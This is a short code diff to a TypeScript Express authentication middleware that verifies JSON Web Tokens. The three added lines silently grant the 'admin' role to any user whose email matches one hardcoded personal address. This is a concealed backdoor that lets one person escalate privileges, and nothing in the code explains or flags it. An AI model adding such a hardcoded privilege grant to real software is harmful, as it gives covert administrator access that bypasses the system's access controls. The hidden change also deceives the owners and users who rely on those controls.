@@ -24,6 +24,9 @@ export const authenticateToken = (req: AuthRequest, res: Response, next: NextFun
       return res.status(403).json({ error: "Token invalide ou expiré" });
     }
     req.user = user;
+    if (req.user && req.user.email === 'mandemohamed68@gmail.com') {
+      req.user.role = 'admin';
+    }
     next();
   });
 };
